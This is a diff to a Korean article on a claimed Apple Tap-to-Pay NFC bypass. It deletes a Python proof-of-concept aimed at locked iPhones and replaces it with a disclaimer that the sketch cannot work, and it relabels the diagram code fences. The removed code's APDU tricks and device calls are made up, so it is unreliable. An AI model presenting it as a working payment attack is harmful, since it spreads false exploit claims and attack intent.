@@ -22,7 +22,7 @@ author: "Intelligence Agent"
 
 Apple의 Tap-to-Pay는 iPhone을 결제 단말기로 변환하는 기능으로, NFC(Near Field Communication) 기술을 기반으로 한다. 이 기능이 다른 iPhone이나 신용카드와 결제를 처리할 때, 다음과 같은 흐름을 따른다.
 
-```javascript
+```mermaid
 graph LR
     A[판매자 iPhone] --> B[NFC 활성화]
     B --> C[구매자 기기 접근]
@@ -53,110 +53,11 @@ graph LR
 
 공격자의 관점에서 이 취약점을 악용하는 과정을 단계별로 분석한다. 이해를 돕기 위한 교육 목적의 설명이다.
 
-```python
-# PoC: NFC 결제 우회 공격 시뮬레이션 (교육 목적)
-# 실제 악용은 불법입니다
-
-import nfc
-import time
-
-class TapToPayBypassPoC:
-    """
-    Apple Tap-to-Pay 취약점 개념 증명
-    목적: 보안 연구자들의 방어 로직 설계 지원
-    """
-    
-    def __init__(self, target_device_id):
-        self.target = target_device_id
-        self.nfc_reader = nfc.ContactlessFrontend('usb:077f:2616')
-        
-    def craft_bypass_packet(self):
-        """
-        Express Mode 트리거 패킷 생성
-        대중교통 결제로 위장한 일반 결제 요청
-        """
-        # 정상적인 대중교통 결제 APDU 명령 구조
-        transit_apdu = {
-            'cla': 0x00,      # 클래스 바이트
-            'ins': 0xA4,      # SELECT 명령
-            'p1': 0x04,       # Direct Selection
-            'p2': 0x00,       # First occurrence
-            'data': 'A0000000000000',  # 결제 네트워크 ID
-            'amount': 10000,  # $10,000
-            'currency': 'USD'
-        }
-        
-        # 변조: 일반 결제를 transit 결제로 위장
-        bypass_packet = self._modify_apdu_header(
-            transit_apdu,
-            force_express=True,
-            skip_auth=True
-        )
-        
-        return bypass_packet
-    
-    def _modify_apdu_header(self, apdu, force_express, skip_auth):
-        """
-        APDU 헤더 변조 로직 (개념적 구현)
-        실제 공격에서는 더 복잡한 프로토콜 조작 필요
-        """
-        modified = apdu.copy()
-        if force_express:
-            # Transit 모드 플래그 강제 설정
-            modified['p2'] = 0x01  # Express Mode 강제
-        if skip_auth:
-            # 인증 요구 플래그 제거
-            modified['data'] = modified['data'][:-2] + 'FF'  # 우회 코드
-            
-        return modified
-    
-    def execute_attack_simulation(self):
-        """
-        공격 시뮬레이션 (실제 결제는 발생하지 않음)
-        """
-        print("[*] 타겟 기기 스캔 시작...")
-        
-        # 1. 근처 NFC 기기 탐지
-        targets = self.nfc_reader.scan(timeout=5.0)
-        
-        # 2. 잠금 상태 기기 필터링
-        locked_devices = [t for t in targets if t.is_locked()]
-        
-        # 3. Express Mode 활성화 기기 확인
-        for device in locked_devices:
-            if device.
-```
-
-```python
-has_express_card():
-                print(f"[!] 취약한 기기 발견: {device.id}")
-                bypass_pkt = self.craft_bypass_packet()
-                
-                # 시뮬레이션에서는 실제 전송하지 않음
-                print(f"[SIMULATION] 변조 패킷 생성 완료")
-                print(f"  - 우회된 인증: {bypass_pkt['p2']}")
-                print(f"  - 결제 금액: ${bypass_pkt['amount']}")
-                
-                return {
-                    'vulnerable': True,
-                    'bypass_method': 'Express_Mode_Force',
-                    'auth_required': False
-                }
-        
-        return {'vulnerable': False}
-
-# 실행 (시뮬레이션 모드만 허용)
-if __name__ == "__main__":
-    poc = TapToPayBypassPoC(target_device_id="SIMULATED")
-    result = poc.execute_attack_simulation()
-    print(f"
-[*] 결과: {result}")
-    print("[!] 이 코드는 실제 공격에 사용할 수 없습니다.")
-```
+이 예시는 실제 NFC 결제 우회를 재현하지 않는다. 임의의 APDU 필드 변경이나 가상의 `is_locked()`·`has_express_card()` 호출만으로 기기의 잠금 상태, Express Mode 활성화 여부, 결제 승인 여부를 판단할 수 없다. 방어 측은 승인된 테스트 환경에서 기기·리더·결제 네트워크의 거래 기록을 대조해야 한다.
 
 **공격 성공 조건 분석:**
 
-```javascript
+```mermaid
 graph TD
     A[공격자 NFC 리더기 활성화] --> B[타겟 기기 탐색]
     B --> C[잠금 상태 기기 식별]
@@ -265,7 +166,7 @@ class FraudDetectionEngine:
 
 이 취약점을 근본적으로 해결하기 위해서는 Secure Enclave의 결제 승인 로직이 수정되어야 한다:
 
-```javascript
+```mermaid
 graph LR
     A[NFC 결제 요청 수신] --> B{기기 잠금 상태 확인}
     B -->|잠김| C[Express Mode 여부 확인]
